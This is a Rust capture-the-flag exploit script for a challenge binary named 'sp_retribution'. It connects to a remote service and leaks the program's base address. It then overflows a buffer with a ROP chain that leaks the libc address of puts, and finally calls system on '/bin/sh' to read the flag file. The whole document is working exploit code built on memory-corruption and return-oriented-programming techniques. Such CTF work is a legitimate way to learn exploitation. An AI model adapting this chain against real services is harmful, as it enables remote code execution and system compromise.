use std::ops::Not;

use ctf_pwn::io::*;
use ctf_pwn::unix::*;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    loop{

        let mut pipe = TcpPipe::connect("123.123.123.123:1337").await?;

        let payload_base = Payload::builder()
            .x64()
            .recv_until_utf8(">> ", false)
            .push_line("2")
            .send()
            .recv_until_regex(r"Insert new.*y = ", false)
            .push("1")
            .send()
            .recv_until(", y = ", false)
            .recv_until("\n[*]", true);
    
        let payload = payload_base.clone()
            .convert(|leak| {
                let mut buf = [0u8; 8];
                buf[..usize::min(8, leak.len())].copy_from_slice(&leak);
                let base_leak = u64::from_le_bytes(buf);
                base_leak & 0xFFFu64.not()
            })
            .condition(|&leak| leak > 0x1000000)
            //.print_lower_hex()
            .build();
    
        let leak = match pipe.payload(payload).await
        {
            Ok(leak) => leak,
            Err(PipeError::ConditionFailed) => continue,
            Err(e) => return Err(e.into()),
        };
        
        println!("Base leak: {leak}");
    
        let pop_rdi = leak + 0xd33;
        let ret = leak + 0x746;
    
        let elf = Elf::parse("sp_retribution").await?;
        let puts_got = leak + *elf.got().get("puts").unwrap();
        let puts_plt = leak + *elf.plt().get("puts").unwrap();
        let main = leak + elf.symbols().get("main").unwrap().value;
    
        let payload = Payload::builder()
            .x64()
            .recv_until_utf8("Verify new coordinates? (y/n): ", false)
            .fill("A", 0x58)
            .push_ptr(pop_rdi)
            .push_ptr(puts_got)
            .push_ptr(puts_plt)
            .push_ptr(main)
            .send()
            .recv_until("\x1B[1;34m\n", false)
            .recv_line()
            .convert(|leak| {
                let mut buf = [0u8; 8];
                buf[..usize::min(8, leak.len())].copy_from_slice(&leak);
                let leak = u64::from_le_bytes(buf);
                leak
            })
            //.print_lower_hex()
            .condition(|&leak| leak > 0x1000000)
            .build();
    
        let libc_elf =
            Elf::parse("glibc/libc.so.6").await?;
    
        let libc_leak = match pipe.payload(payload).await
        {
            Ok(value) => value,
            Err(PipeError::ConditionFailed) => continue,
            Err(e) => return Err(e.into()),
        };

        let libc_leak = libc_leak - libc_elf.dynamic_symbols().get("puts").unwrap().value;
    
        println!("Libc leak: {libc_leak:x}");
    
        let bin_sh = libc_leak + 0x18ce57;
        let system = libc_leak + libc_elf.dynamic_symbols().get("system").unwrap().value;
    
        let payload = payload_base.clone()
            .recv_until("Verify new coordinates? (y/n): ", true)
            .fill("A", 0x58)
            .push_ptr(ret)
            .push_ptr(pop_rdi)
            .push_ptr(bin_sh)
            .push_ptr(system)
            .send()
            .recv_until("Coordinates have been reset!", true)
            .recv_line()
            .push_line("cat flag.txt")
            .send()
            .recv_line_utf8()
            .build();
    
    
        let flag = match pipe.payload(payload).await
        {
            Ok(value) => value,
            Err(PipeError::ConditionFailed) => continue,
            Err(e) => return Err(e.into()),
        };
        println!("Flag: {flag}");
        break;
    }

    Ok(())
}
